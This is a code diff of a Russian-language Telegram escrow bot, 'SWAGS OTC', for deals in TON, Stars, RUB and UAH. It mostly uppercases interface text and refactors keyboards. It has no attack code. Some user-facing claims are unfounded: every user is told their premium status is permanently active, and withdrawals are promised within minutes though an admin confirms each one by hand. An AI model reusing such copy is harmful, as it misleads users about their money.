@@ -133,18 +133,18 @@ class AdminAddBalanceState(StatesGroup):
     waiting_for_currency = State()
     waiting_for_amount = State()
 
-# ========== КЛАВИАТУРЫ ==========
+# ========== КРАСИВОЕ МЕНЮ ==========
 def main_menu(user_id):
     buttons = [
-        [KeyboardButton(text="📦 Создать сделку")],
-        [KeyboardButton(text="💰 Баланс и вывод")],
-        [KeyboardButton(text="ℹ️ Мои сделки")],
-        [KeyboardButton(text="⭐️ Премиум")],
-        [KeyboardButton(text="❓ Частые вопросы")],
-        [KeyboardButton(text="🆘 Поддержка")]
+        [KeyboardButton(text="📦 СОЗДАТЬ СДЕЛКУ")],
+        [KeyboardButton(text="💰 МОЙ БАЛАНС")],
+        [KeyboardButton(text="📋 МОИ СДЕЛКИ")],
+        [KeyboardButton(text="⭐️ ПРЕМИУМ")],
+        [KeyboardButton(text="❓ FAQ")],
+        [KeyboardButton(text="🆘 ПОДДЕРЖКА")]
     ]
     if is_admin(user_id):
-        buttons.append([KeyboardButton(text="👑 Админ-панель")])
+        buttons.append([KeyboardButton(text="👑 АДМИН ПАНЕЛЬ")])
     return ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)
 
 def currency_keyboard():
@@ -167,23 +167,23 @@ def withdraw_currency_keyboard():
 
 def admin_panel_keyboard():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🖼 Изменить фото при старте", callback_data="change_photo")],
+        [InlineKeyboardButton(text="🖼 СМЕНИТЬ СТАРТ ФОТО", callback_data="change_photo")],
         [InlineKeyboardButton(text="💰 НАЧИСЛИТЬ БАЛАНС", callback_data="admin_add_balance")],
-        [InlineKeyboardButton(text="➕ Добавить админа", callback_data="add_admin")],
-        [InlineKeyboardButton(text="➖ Удалить админа", callback_data="remove_admin")],
-        [InlineKeyboardButton(text="📋 Список админов", callback_data="list_admins")],
-        [InlineKeyboardButton(text="💳 Реквизиты оплаты", callback_data="edit_rekvisits")],
-        [InlineKeyboardButton(text="📊 Все сделки", callback_data="all_deals")],
-        [InlineKeyboardButton(text="💸 Заявки на вывод", callback_data="withdraw_requests")]
+        [InlineKeyboardButton(text="➕ ДОБАВИТЬ АДМИНА", callback_data="add_admin")],
+        [InlineKeyboardButton(text="➖ УДАЛИТЬ АДМИНА", callback_data="remove_admin")],
+        [InlineKeyboardButton(text="📋 СПИСОК АДМИНОВ", callback_data="list_admins")],
+        [InlineKeyboardButton(text="💳 РЕКВИЗИТЫ ОПЛАТЫ", callback_data="edit_rekvisits")],
+        [InlineKeyboardButton(text="📊 ВСЕ СДЕЛКИ", callback_data="all_deals")],
+        [InlineKeyboardButton(text="💸 ЗАЯВКИ НА ВЫВОД", callback_data="withdraw_requests")]
     ])
 
 def rekvisits_edit_keyboard():
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💎 Изменить TON", callback_data="edit_ton")],
-        [InlineKeyboardButton(text="⭐️ Изменить STARS", callback_data="edit_stars")],
-        [InlineKeyboardButton(text="₽ Изменить RUB", callback_data="edit_rub")],
-        [InlineKeyboardButton(text="₴ Изменить UAH", callback_data="edit_uah")],
-        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_admin")]
+        [InlineKeyboardButton(text="💎 ИЗМЕНИТЬ TON", callback_data="edit_ton")],
+        [InlineKeyboardButton(text="⭐️ ИЗМЕНИТЬ STARS", callback_data="edit_stars")],
+        [InlineKeyboardButton(text="₽ ИЗМЕНИТЬ RUB", callback_data="edit_rub")],
+        [InlineKeyboardButton(text="₴ ИЗМЕНИТЬ UAH", callback_data="edit_uah")],
+        [InlineKeyboardButton(text="🔙 НАЗАД", callback_data="back_to_admin")]
     ])
 
 def seller_confirm_keyboard(deal_id):
@@ -193,7 +193,14 @@ def seller_confirm_keyboard(deal_id):
 
 def buyer_confirm_keyboard(deal_id):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ ПОЛУЧИЛ ТОВАР", callback_data=f"buyer_confirm_{deal_id}")]
+        [InlineKeyboardButton(text="✅ ПОЛУЧИЛ ТОВАР", callback_data=f"buyer_confirm_{deal_id}")],
+        [InlineKeyboardButton(text="❓ В ПОДДЕРЖКУ", callback_data=f"support_{deal_id}")]
+    ])
+
+def buyer_pending_keyboard(deal_id):
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="⏳ ОЖИДАНИЕ ПЕРЕДАЧИ", callback_data="noop")],
+        [InlineKeyboardButton(text="❓ В ПОДДЕРЖКУ", callback_data=f"support_{deal_id}")]
     ])
 
 def payment_method_keyboard(deal_id):
@@ -236,22 +243,22 @@ def get_rekvisits_text(currency, amount):
 async def send_welcome_message(message: types.Message):
     welcome_text = """✨ SWAGS OTC — БЕЗОПАСНЫЕ СДЕЛКИ ✨
 
-🛡 Почему мы?
+🛡️ ПОЧЕМУ МЫ?
 • 🤝 Честные сделки между продавцами и покупателями
 • 💎 TON | ⭐️ STARS | ₽ RUB | ₴ UAH
 • 🔒 Гарант безопасности с обеих сторон
 • 💎 Премиум поддержка 24/7
 
-📌 Как это работает:
+📌 КАК ЭТО РАБОТАЕТ:
 1️⃣ Продавец создаёт сделку
 2️⃣ Продавец отправляет ссылку покупателю
-3️⃣ Покупатель выбирает способ оплаты (реквизиты / с баланса)
-4️⃣ Администратор проверяет оплату (если по реквизитам) или оплата с баланса
+3️⃣ Покупатель выбирает способ оплаты
+4️⃣ Администратор проверяет оплату (или оплата с баланса)
 5️⃣ Продавец нажимает «Передал товар»
 6️⃣ Покупатель нажимает «Получил товар»
-7️⃣ ТОЛЬКО ПОСЛЕ ЭТОГО деньги зачисляются на баланс продавца
+7️⃣ Деньги зачисляются на баланс продавца
 
-👇 Начните прямо сейчас 👇"""
+👇 НАЧНИ ПРЯМО СЕЙЧАС 👇"""
     
     if start_photo.get("file_id"):
         try:
@@ -269,16 +276,9 @@ async def send_welcome_message(message: types.Message):
         reply_markup=main_menu(message.from_user.id)
     )
 
-# ========== ОТПРАВКА СООБЩЕНИЯ ПОКУПАТЕЛЮ ПОСЛЕ ОПЛАТЫ ==========
 async def send_buyer_pending_message(deal_id: str):
-    """Отправляет покупателю сообщение с неактивной кнопкой"""
     deal = deals[deal_id]
-    
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="⏳ ОЖИДАНИЕ ПЕРЕДАЧИ", callback_data="noop")],
-        [InlineKeyboardButton(text="❓ В ПОДДЕРЖКУ", callback_data=f"support_{deal_id}")]
-    ])
-    
+    keyboard = buyer_pending_keyboard(deal_id)
     try:
         msg = await bot.send_message(
             deal["buyer_username"],
@@ -286,7 +286,7 @@ async def send_buyer_pending_message(deal_id: str):
             f"📦 Товар: {deal['product']}\n"
             f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
             f"👤 Продавец: @{deal['seller_username']}\n\n"
-            f"⏳ Кнопка «ПОЛУЧИЛ ТОВАР» появится ПОСЛЕ того, как продавец передаст товар.",
+            f"⏳ Продавец получил уведомление. Как только он передаст товар — вы сможете подтвердить получение.",
             reply_markup=keyboard
         )
         deals[deal_id]["buyer_message_id"] = msg.message_id
@@ -306,10 +306,9 @@ async def cmd_start(message: types.Message):
         
         deal = deals[deal_id]
         
-        # ПРОВЕРКА: заходит только тот, кого указал продавец
         if message.from_user.username != deal["buyer_username"]:
             await message.answer(
-                f"❌ Доступ запрещён!\n\nЭта сделка предназначена для @{deal['buyer_username']}\n\nОбратитесь в поддержку: {SUPPORT_LINK}"
+                f"❌ ДОСТУП ЗАПРЕЩЁН!\n\nЭта сделка для @{deal['buyer_username']}\n\nОбратитесь в поддержку: {SUPPORT_LINK}"
             )
             await log_to_master(f"⚠️ НЕСАНКЦИОНИРОВАННЫЙ ЗАХОД\nСделка: #{deal_id}\nПопытался: @{message.from_user.username}\nОжидался: @{deal['buyer_username']}")
             return
@@ -337,7 +336,7 @@ async def cmd_start(message: types.Message):
     await send_welcome_message(message)
 
 # ========== БАЛАНС И ВЫВОД ==========
-@dp.message(F.text == "💰 Баланс и вывод")
+@dp.message(F.text == "💰 МОЙ БАЛАНС")
 async def show_balance(message: types.Message):
     user_balance = get_balance(message.from_user.id)
     text = f"""💰 ВАШ БАЛАНС 💰
@@ -347,7 +346,7 @@ async def show_balance(message: types.Message):
 ₽ RUB: {user_balance['rub']}
 ₴ UAH: {user_balance['uah']}
 
-Для вывода средств нажмите кнопку ниже 👇"""
+ДЛЯ ВЫВОДА НАЖМИТЕ КНОПКУ 👇"""
     
     await message.answer(
         text,
@@ -365,7 +364,7 @@ async def start_withdraw(callback: types.CallbackQuery, state: FSMContext):
         await callback.answer("❌ У вас нет средств для вывода", show_alert=True)
         return
     
-    await callback.message.answer("💰 Выберите валюту для вывода:", reply_markup=withdraw_currency_keyboard())
+    await callback.message.answer("💰 ВЫБЕРИТЕ ВАЛЮТУ ДЛЯ ВЫВОДА:", reply_markup=withdraw_currency_keyboard())
     await state.set_state(WithdrawStates.waiting_for_currency)
     await callback.answer()
 
@@ -382,9 +381,9 @@ async def withdraw_currency(callback: types.CallbackQuery, state: FSMContext):
     await state.update_data(withdraw_currency=currency, withdraw_amount=user_balance[curr_key])
     
     if currency == "STARS":
-        await callback.message.answer("⭐️ Введите ваш Telegram username для получения звёзд:\n\nПример: @john_doe")
+        await callback.message.answer("⭐️ ВВЕДИТЕ ВАШ TELEGRAM USERNAME ДЛЯ ПОЛУЧЕНИЯ ЗВЁЗД:\n\nПРИМЕР: @john_doe")
     else:
-        await callback.message.answer(f"💸 Введите реквизиты для вывода {currency}:\n\nПример для TON: UQ...\nПример для RUB/UAH: номер карты или кошелёк")
+        await callback.message.answer(f"💸 ВВЕДИТЕ РЕКВИЗИТЫ ДЛЯ ВЫВОДА {currency}:\n\nПРИМЕР ДЛЯ TON: UQ...\nПРИМЕР ДЛЯ RUB/UAH: НОМЕР КАРТЫ ИЛИ КОШЕЛЁК")
     
     await state.set_state(WithdrawStates.waiting_for_details)
     await callback.answer()
@@ -415,14 +414,14 @@ async def withdraw_details(message: types.Message, state: FSMContext):
         f"👤 Пользователь: {message.from_user.full_name} (@{message.from_user.username})\n"
         f"💰 Сумма: {amount} {currency}\n"
         f"📝 Реквизиты: {details}\n\n"
-        f"Для подтверждения введите: /confirm_withdraw {request_id}"
+        f"ДЛЯ ПОДТВЕРЖДЕНИЯ: /confirm_withdraw {request_id}"
     )
     
     await message.answer(
-        f"✅ Заявка на вывод #{request_id} создана!\n\n"
+        f"✅ ЗАЯВКА НА ВЫВОД #{request_id} СОЗДАНА!\n\n"
         f"💰 Сумма: {amount} {currency}\n"
-        f"⏳ Ожидайте вывода в течение 1-5 минут.\n\n"
-        f"Статус заявки можно узнать по команде /withdraw_status {request_id}"
+        f"⏳ ОЖИДАЙТЕ ВЫВОДА В ТЕЧЕНИЕ 1-5 МИНУТ.\n\n"
+        f"СТАТУС ЗАЯВКИ: /withdraw_status {request_id}"
     )
     
     await log_to_master(f"💸 Новая заявка на вывод: #{request_id} от @{message.from_user.username}")
@@ -431,22 +430,22 @@ async def withdraw_details(message: types.Message, state: FSMContext):
 @dp.message(Command("confirm_withdraw"))
 async def confirm_withdraw(message: types.Message):
     if not is_admin(message.from_user.id):
-        await message.answer("⛔️ Недостаточно прав")
+        await message.answer("⛔️ НЕДОСТАТОЧНО ПРАВ")
         return
     
     args = message.text.split()
     if len(args) != 2:
-        await message.answer("❌ Использование: /confirm_withdraw [ID заявки]")
+        await message.answer("❌ ИСПОЛЬЗОВАНИЕ: /confirm_withdraw [ID ЗАЯВКИ]")
         return
     
     request_id = args[1]
     if request_id not in withdraw_requests:
-        await message.answer(f"❌ Заявка {request_id} не найдена")
+        await message.answer(f"❌ ЗАЯВКА {request_id} НЕ НАЙДЕНА")
         return
     
     req = withdraw_requests[request_id]
     if req["status"] != "pending":
-        await message.answer(f"❌ Заявка уже обработана: {req['status']}")
+        await message.answer(f"❌ ЗАЯВКА УЖЕ ОБРАБОТАНА: {req['status']}")
         return
     
     req["status"] = "completed"
@@ -466,30 +465,30 @@ async def confirm_withdraw(message: types.Message):
             f"✅ ВЫВОД СРЕДСТВ ПОДТВЕРЖДЁН!\n\n"
             f"💰 Сумма: {req['amount']} {req['currency']}\n"
             f"📝 Реквизиты: {req['details']}\n\n"
-            f"Средства отправлены в течение 1-5 минут."
+            f"СРЕДСТВА ОТПРАВЛЕНЫ В ТЕЧЕНИЕ 1-5 МИНУТ."
         )
     except:
         pass
     
-    await message.answer(f"✅ Вывод #{request_id} подтверждён! Средства списаны с баланса.")
+    await message.answer(f"✅ ВЫВОД #{request_id} ПОДТВЕРЖДЁН! СРЕДСТВА СПИСАНЫ С БАЛАНСА.")
     await log_to_master(f"✅ Вывод #{request_id} подтверждён админом @{message.from_user.username}")
 
 @dp.message(Command("withdraw_status"))
 async def withdraw_status(message: types.Message):
     args = message.text.split()
     if len(args) != 2:
-        await message.answer("❌ Использование: /withdraw_status [ID заявки]")
+        await message.answer("❌ ИСПОЛЬЗОВАНИЕ: /withdraw_status [ID ЗАЯВКИ]")
         return
     
     request_id = args[1]
     if request_id not in withdraw_requests:
-        await message.answer(f"❌ Заявка {request_id} не найдена")
+        await message.answer(f"❌ ЗАЯВКА {request_id} НЕ НАЙДЕНА")
         return
     
     req = withdraw_requests[request_id]
     status_text = {
-        "pending": "⏳ В обработке",
-        "completed": "✅ Выполнен"
+        "pending": "⏳ В ОБРАБОТКЕ",
+        "completed": "✅ ВЫПОЛНЕН"
     }.get(req["status"], req["status"])
     
     await message.answer(
@@ -500,22 +499,22 @@ async def withdraw_status(message: types.Message):
     )
 
 # ========== СОЗДАНИЕ СДЕЛКИ ==========
-@dp.message(F.text == "📦 Создать сделку")
+@dp.message(F.text == "📦 СОЗДАТЬ СДЕЛКУ")
 async def create_deal_start(message: types.Message, state: FSMContext):
-    await message.answer("📝 Опишите товар или услугу, которую вы продаёте:\n\nПример: NFT-подарок Telegram Premium")
+    await message.answer("📝 ОПИШИТЕ ТОВАР ИЛИ УСЛУГУ, КОТОРУЮ ВЫ ПРОДАЁТЕ:\n\nПРИМЕР: NFT-подарок Telegram Premium")
     await state.set_state(DealStates.waiting_for_product)
 
 @dp.message(DealStates.waiting_for_product)
 async def get_product(message: types.Message, state: FSMContext):
     await state.update_data(product=message.text.strip())
-    await message.answer("💱 Выберите валюту сделки:", reply_markup=currency_keyboard())
+    await message.answer("💱 ВЫБЕРИТЕ ВАЛЮТУ СДЕЛКИ:", reply_markup=currency_keyboard())
     await state.set_state(DealStates.waiting_for_currency)
 
 @dp.callback_query(lambda c: c.data.startswith("curr_"))
 async def get_currency(callback: types.CallbackQuery, state: FSMContext):
     currency = callback.data.split("_")[1]
     await state.update_data(currency=currency)
-    await callback.message.edit_text(f"💰 Введите сумму сделки (только число):\nВалюта: {currency}")
+    await callback.message.edit_text(f"💰 ВВЕДИТЕ СУММУ СДЕЛКИ (ТОЛЬКО ЧИСЛО):\nВАЛЮТА: {currency}")
     await state.set_state(DealStates.waiting_for_amount)
     await callback.answer()
 
@@ -526,10 +525,10 @@ async def get_amount(message: types.Message, state: FSMContext):
         if amount <= 0:
             raise ValueError
         await state.update_data(amount=amount)
-        await message.answer("👤 Введите Telegram username покупателя (без @):\n\nПример: john_doe\n\n⚠️ Только этот пользователь сможет зайти в сделку!")
+        await message.answer("👤 ВВЕДИТЕ TELEGRAM USERNAME ПОКУПАТЕЛЯ (БЕЗ @):\n\nПРИМЕР: john_doe\n\n⚠️ ТОЛЬКО ЭТОТ ПОЛЬЗОВАТЕЛЬ СМОЖЕТ ЗАЙТИ В СДЕЛКУ!")
         await state.set_state(DealStates.waiting_for_buyer_username)
     except:
-        await message.answer("❌ Введите положительное число, например: 1500")
+        await message.answer("❌ ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО, НАПРИМЕР: 1500")
 
 @dp.message(DealStates.waiting_for_buyer_username)
 async def get_buyer(message: types.Message, state: FSMContext):
@@ -554,18 +553,16 @@ async def get_buyer(message: types.Message, state: FSMContext):
     }
     save_deals(deals)
     
-    # НОВАЯ ССЫЛКА - открывает Telegram и сразу показывает бота
-    deal_link = f"tg://resolve?domain={BOT_USERNAME}&start=deal_{deal_id}"
+    deal_link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
     
     await message.answer(
-        f"✅ Сделка #{deal_id} создана!\n\n"
+        f"✅ СДЕЛКА #{deal_id} СОЗДАНА!\n\n"
         f"💰 Сумма: {data['amount']} {data['currency']}\n"
         f"📦 Товар: {data['product']}\n"
         f"👤 Покупатель: @{buyer_username}\n\n"
-        f"🔗 Отправьте ЭТУ ССЫЛКУ покупателю:",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔗 ОТПРАВИТЬ ССЫЛКУ", url=deal_link)]
-        ])
+        f"🔗 ОТПРАВЬТЕ ЭТУ ССЫЛКУ ПОКУПАТЕЛЮ (ПРОСТО СКОПИРУЙТЕ ИЛИ ПЕРЕШЛИТЕ):\n\n"
+        f"{deal_link}\n\n"
+        f"⚡️ ПОСЛЕ ТОГО КАК ПОКУПАТЕЛЬ ОПЛАТИТ, ВЫ ПОЛУЧИТЕ УВЕДОМЛЕНИЕ."
     )
     
     await log_to_master(
@@ -583,12 +580,12 @@ async def get_buyer(message: types.Message, state: FSMContext):
 async def pay_by_rekvisits(callback: types.CallbackQuery):
     deal_id = callback.data.split("_")[2]
     if deal_id not in deals:
-        await callback.answer("❌ Сделка не найдена")
+        await callback.answer("❌ СДЕЛКА НЕ НАЙДЕНА")
         return
     
     deal = deals[deal_id]
     if deal["status"] != "waiting_payment":
-        await callback.answer(f"❌ Сделка уже в статусе {deal['status']}")
+        await callback.answer(f"❌ СДЕЛКА УЖЕ В СТАТУСЕ {deal['status']}")
         return
     
     pay_text = get_rekvisits_text(deal["currency"], deal["amount"])
@@ -599,7 +596,7 @@ async def pay_by_rekvisits(callback: types.CallbackQuery):
         f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
         f"👤 Продавец: @{deal['seller_username']}\n\n"
         f"💳 РЕКВИЗИТЫ ДЛЯ ОПЛАТЫ:\n{pay_text}\n\n"
-        f"✨ После оплаты администратор проверит платёж командой /pay {deal_id} ✨"
+        f"✨ ПОСЛЕ ОПЛАТЫ АДМИНИСТРАТОР ПРОВЕРИТ ПЛАТЁЖ КОМАНДОЙ /pay {deal_id} ✨"
     )
     
     await callback.answer()
@@ -609,48 +606,44 @@ async def pay_by_rekvisits(callback: types.CallbackQuery):
 async def pay_by_balance(callback: types.CallbackQuery):
     deal_id = callback.data.split("_")[2]
     if deal_id not in deals:
-        await callback.answer("❌ Сделка не найдена")
+        await callback.answer("❌ СДЕЛКА НЕ НАЙДЕНА")
         return
     
     deal = deals[deal_id]
     if deal["status"] != "waiting_payment":
-        await callback.answer(f"❌ Сделка уже в статусе {deal['status']}")
+        await callback.answer(f"❌ СДЕЛКА УЖЕ В СТАТУСЕ {deal['status']}")
         return
     
     buyer_balance = get_balance(callback.from_user.id)
     curr_key = deal["currency"].lower()
     
     if buyer_balance.get(curr_key, 0) < deal["amount"]:
-        await callback.answer(f"❌ Недостаточно средств на балансе!\nНужно: {deal['amount']} {deal['currency']}\nДоступно: {buyer_balance.get(curr_key, 0)}", show_alert=True)
+        await callback.answer(f"❌ НЕДОСТАТОЧНО СРЕДСТВ НА БАЛАНСЕ!\nНУЖНО: {deal['amount']} {deal['currency']}\nДОСТУПНО: {buyer_balance.get(curr_key, 0)}", show_alert=True)
         return
     
-    # Списываем с баланса покупателя
     buyer_balance[curr_key] -= deal["amount"]
     save_balance(balance)
     
-    # Меняем статус сделки на "paid"
     deal["status"] = "paid"
     deal["paid_by_admin"] = callback.from_user.id
     save_deals(deals)
     
     await callback.message.edit_text(
         f"✅ ОПЛАТА ПОДТВЕРЖДЕНА!\n\n"
-        f"Сделка #{deal_id}\n"
-        f"Списано с баланса: {deal['amount']} {deal['currency']}\n\n"
-        f"Продавец получит уведомление для передачи товара."
+        f"СДЕЛКА #{deal_id}\n"
+        f"СПИСАНО С БАЛАНСА: {deal['amount']} {deal['currency']}\n\n"
+        f"ПРОДАВЕЦ ПОЛУЧИТ УВЕДОМЛЕНИЕ ДЛЯ ПЕРЕДАЧИ ТОВАРА."
     )
     
-    # Отправляем покупателю сообщение с ожиданием
     await send_buyer_pending_message(deal_id)
     
-    # Уведомляем продавца
     await bot.send_message(
         deal["seller_id"],
         f"💎 СДЕЛКА #{deal_id} ОПЛАЧЕНА! 💎\n\n"
         f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
         f"📦 Товар: {deal['product']}\n"
         f"👤 Покупатель: @{deal['buyer_username']}\n\n"
-        f"👇 Нажмите кнопку, когда передадите товар 👇",
+        f"👇 НАЖМИТЕ КНОПКУ, КОГДА ПЕРЕДАДИТЕ ТОВАР 👇",
         reply_markup=seller_confirm_keyboard(deal_id)
     )
     
@@ -661,41 +654,39 @@ async def pay_by_balance(callback: types.CallbackQuery):
 @dp.message(Command("pay"))
 async def pay_command(message: types.Message):
     if not is_admin(message.from_user.id):
-        await message.answer("⛔️ Недостаточно прав")
+        await message.answer("⛔️ НЕДОСТАТОЧНО ПРАВ")
         return
     
     args = message.text.split()
     if len(args) != 2:
-        await message.answer("❌ Использование: /pay [ID сделки]\nПример: /pay a3f2b1c4")
+        await message.answer("❌ ИСПОЛЬЗОВАНИЕ: /pay [ID СДЕЛКИ]\nПРИМЕР: /pay a3f2b1c4")
         return
     
     deal_id = args[1]
     if deal_id not in deals:
-        await message.answer(f"❌ Сделка с ID {deal_id} не найдена")
+        await message.answer(f"❌ СДЕЛКА С ID {deal_id} НЕ НАЙДЕНА")
         return
     
     deal = deals[deal_id]
     if deal["status"] != "waiting_payment":
-        await message.answer(f"❌ Сделка уже в статусе {deal['status']}")
+        await message.answer(f"❌ СДЕЛКА УЖЕ В СТАТУСЕ {deal['status']}")
         return
     
     deal["status"] = "paid"
     deal["paid_by_admin"] = message.from_user.id
     save_deals(deals)
     
-    await message.answer(f"✅ Оплата подтверждена для сделки {deal_id}")
+    await message.answer(f"✅ ОПЛАТА ПОДТВЕРЖДЕНА ДЛЯ СДЕЛКИ {deal_id}")
     
-    # Отправляем покупателю сообщение с ожиданием
     await send_buyer_pending_message(deal_id)
     
-    # Уведомляем продавца
     await bot.send_message(
         deal["seller_id"],
         f"💎 СДЕЛКА #{deal_id} ОПЛАЧЕНА! 💎\n\n"
         f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
         f"📦 Товар: {deal['product']}\n"
         f"👤 Покупатель: @{deal['buyer_username']}\n\n"
-        f"👇 Нажмите кнопку, когда передадите товар 👇",
+        f"👇 НАЖМИТЕ КНОПКУ, КОГДА ПЕРЕДАДИТЕ ТОВАР 👇",
         reply_markup=seller_confirm_keyboard(deal_id)
     )
     
@@ -712,30 +703,24 @@ async def pay_command(message: types.Message):
 async def seller_delivered(callback: types.CallbackQuery):
     deal_id = callback.data.split("_")[-1]
     if deal_id not in deals:
-        await callback.answer("❌ Сделка не найдена")
+        await callback.answer("❌ СДЕЛКА НЕ НАЙДЕНА")
         return
     
     deal = deals[deal_id]
     if deal["status"] != "paid":
-        await callback.answer("❌ Оплата ещё не подтверждена")
+        await callback.answer("❌ ОПЛАТА ЕЩЁ НЕ ПОДТВЕРЖДЕНА")
         return
     
-    # Меняем статус
     deal["status"] = "awaiting_confirmation"
     save_deals(deals)
     
     await callback.message.edit_text(
-        f"✅ Продавец подтвердил передачу товара!\n\n"
-        f"Ожидаем подтверждения от покупателя..."
+        f"✅ ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА!\n\n"
+        f"ОЖИДАЕМ ПОДТВЕРЖДЕНИЯ ОТ ПОКУПАТЕЛЯ..."
     )
     
-    # Активируем кнопку у покупателя
     if deal.get("buyer_message_id") and deal.get("buyer_chat_id"):
-        active_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="✅ ПОЛУЧИЛ ТОВАР", callback_data=f"buyer_confirm_{deal_id}")],
-            [InlineKeyboardButton(text="❓ В ПОДДЕРЖКУ", callback_data=f"support_{deal_id}")]
-        ])
-        
+        active_keyboard = buyer_confirm_keyboard(deal_id)
         try:
             await bot.edit_message_reply_markup(
                 chat_id=deal["buyer_chat_id"],
@@ -743,13 +728,12 @@ async def seller_delivered(callback: types.CallbackQuery):
                 reply_markup=active_keyboard
             )
         except Exception as e:
-            await callback.message.answer(f"❌ Не удалось обновить кнопку у покупателя: {e}")
+            await callback.message.answer(f"⚠️ НЕ УДАЛОСЬ ОБНОВИТЬ КНОПКУ У ПОКУПАТЕЛЯ: {e}")
     else:
-        # Если не сохранили ID сообщения, отправляем новое
         await bot.send_message(
             deal["buyer_username"],
             f"📦 ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР!\n\n"
-            f"Сделка #{deal_id}\n"
+            f"СДЕЛКА #{deal_id}\n"
             f"📦 Товар: {deal['product']}\n\n"
             f"✅ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ ТОВАРА:",
             reply_markup=buyer_confirm_keyboard(deal_id)
@@ -762,15 +746,14 @@ async def seller_delivered(callback: types.CallbackQuery):
 async def buyer_confirm_receipt(callback: types.CallbackQuery):
     deal_id = callback.data.split("_")[2]
     if deal_id not in deals:
-        await callback.answer("❌ Сделка не найдена")
+        await callback.answer("❌ СДЕЛКА НЕ НАЙДЕНА")
         return
     
     deal = deals[deal_id]
     if deal["status"] != "awaiting_confirmation":
-        await callback.answer("❌ Продавец ещё не подтвердил передачу товара")
+        await callback.answer("❌ ПРОДАВЕЦ ЕЩЁ НЕ ПОДТВЕРДИЛ ПЕРЕДАЧУ ТОВАРА")
         return
     
-    # Зачисляем деньги продавцу
     add_balance(deal["seller_id"], deal["currency"], deal["amount"])
     
     deal["status"] = "completed"
@@ -779,18 +762,17 @@ async def buyer_confirm_receipt(callback: types.CallbackQuery):
     
     await callback.message.edit_text(
         f"✅ ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА!\n\n"
-        f"Сделка #{deal_id} завершена.\n"
-        f"Спасибо за доверие! 🤝"
+        f"СДЕЛКА #{deal_id} ЗАВЕРШЕНА.\n"
+        f"СПАСИБО ЗА ДОВЕРИЕ! 🤝"
     )
     
-    # Уведомляем продавца
     await bot.send_message(
         deal["seller_id"],
         f"🎉 СДЕЛКА #{deal_id} УСПЕШНО ЗАВЕРШЕНА! 🎉\n\n"
-        f"💰 {deal['amount']} {deal['currency']} зачислены на ваш баланс.\n"
+        f"💰 {deal['amount']} {deal['currency']} ЗАЧИСЛЕНЫ НА ВАШ БАЛАНС.\n"
         f"📦 Товар: {deal['product']}\n"
         f"👤 Покупатель: @{deal['buyer_username']}\n\n"
-        f"Баланс можно проверить в главном меню."
+        f"БАЛАНС МОЖНО ПРОВЕРИТЬ В ГЛАВНОМ МЕНЮ."
     )
     
     await log_to_master(
@@ -803,7 +785,7 @@ async def buyer_confirm_receipt(callback: types.CallbackQuery):
     await callback.answer()
 
 # ========== МОИ СДЕЛКИ ==========
-@dp.message(F.text == "ℹ️ Мои сделки")
+@dp.message(F.text == "📋 МОИ СДЕЛКИ")
 async def my_deals(message: types.Message):
     user_deals = []
     for d_id, d in deals.items():
@@ -811,71 +793,71 @@ async def my_deals(message: types.Message):
             user_deals.append((d_id, d))
     
     if not user_deals:
-        await message.answer("📭 У вас нет сделок.", reply_markup=main_menu(message.from_user.id))
+        await message.answer("📭 У ВАС НЕТ СДЕЛОК.", reply_markup=main_menu(message.from_user.id))
         return
     
     text = "📋 ВАШИ СДЕЛКИ\n\n"
     for d_id, d in user_deals[-10:]:
-        status_emoji = {"waiting_payment": "⏳ ожидает оплаты", "paid": "✅ оплачено", "awaiting_confirmation": "📦 ожидает подтверждения", "completed": "🎉 завершена"}.get(d['status'], d['status'])
+        status_emoji = {"waiting_payment": "⏳ ОЖИДАЕТ ОПЛАТЫ", "paid": "✅ ОПЛАЧЕНО", "awaiting_confirmation": "📦 ОЖИДАЕТ ПОДТВЕРЖДЕНИЯ", "completed": "🎉 ЗАВЕРШЕНА"}.get(d['status'], d['status'])
         text += f"{d_id} | {d['amount']} {d['currency']} | {status_emoji}\n   → {d['product'][:30]}\n\n"
     
     await message.answer(text, reply_markup=main_menu(message.from_user.id))
 
 # ========== ПРЕМИУМ ==========
-@dp.message(F.text == "⭐️ Премиум")
+@dp.message(F.text == "⭐️ ПРЕМИУМ")
 async def premium_info(message: types.Message):
     await message.answer(
         "✨ ПРЕМИУМ СТАТУС ✨\n\n"
-        "💎 Привилегии:\n"
-        "• Приоритетная поддержка 24/7\n"
-        "• Сниженная комиссия (0%)\n"
-        "• Ранний доступ к новым функциям\n"
-        "• Эксклюзивные NFT-награды\n\n"
-        "⭐️ Ваш статус: АКТИВЕН (бессрочно)\n\n"
-        "Спасибо, что вы с нами! 🚀"
+        "💎 ПРИВИЛЕГИИ:\n"
+        "• ПРИОРИТЕТНАЯ ПОДДЕРЖКА 24/7\n"
+        "• СНИЖЕННАЯ КОМИССИЯ (0%)\n"
+        "• РАННИЙ ДОСТУП К НОВЫМ ФУНКЦИЯМ\n"
+        "• ЭКСКЛЮЗИВНЫЕ NFT-НАГРАДЫ\n\n"
+        "⭐️ ВАШ СТАТУС: АКТИВЕН (БЕССРОЧНО)\n\n"
+        "СПАСИБО, ЧТО ВЫ С НАМИ! 🚀"
     )
 
 # ========== ЧАСТЫЕ ВОПРОСЫ ==========
-@dp.message(F.text == "❓ Частые вопросы")
+@dp.message(F.text == "❓ FAQ")
 async def faq(message: types.Message):
     faq_text = """
